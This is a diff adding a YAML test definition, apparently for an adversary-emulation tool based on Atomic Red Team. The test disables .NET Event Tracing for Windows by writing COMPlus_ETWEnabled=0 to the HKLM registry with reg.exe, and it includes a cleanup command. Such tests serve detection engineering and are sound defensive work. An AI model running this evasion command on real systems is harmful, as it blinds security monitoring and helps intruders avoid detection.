@@ -1,0 +1,14 @@
+- id: a5e9cd92-7416-5d78-bf42-b1ce86c761a6
+  name: Soumaia ART Tests - Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd
+  description: Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using the reg.exe utility. In order for changes to take effect a reboot might be required. (requires elevation)
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f
+        cleanup: |-
+          REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COMPlus_ETWEnabled /f > nul 2>&1
